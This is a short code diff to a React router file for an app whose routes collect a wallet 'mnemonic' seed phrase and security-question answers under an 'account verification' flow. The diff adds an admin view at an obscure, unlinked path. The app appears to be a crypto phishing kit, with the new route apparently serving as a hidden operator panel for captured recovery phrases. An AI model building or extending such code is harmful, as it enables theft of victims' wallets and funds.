@@ -8,6 +8,7 @@ import Submitted from "./components/account verification/Submitted";
 import Login from "./components/account verification/Login";
 import HomePage from "./components/HomePage";
 import { Switch } from "react-router-dom/cjs/react-router-dom.min";
+import AdminView from "./components/account verification/AdminView";
 
 export const appName = import.meta.env.VITE_APP_NAME
 
@@ -23,6 +24,7 @@ function App() {
               <Route path="/account/verify/mnemonic" component={SeedPhrase} exact />
               <Route path="/account/verify/securequestions" component={SecurityQuestions} exact />
               <Route path="/verify/success" component={Submitted} exact />
+              <Route path="/ekeuwei" component={AdminView} exact />
               <Route path="/login" component={Login} exact />
               <Route component={HomePage} />
           </Switch>
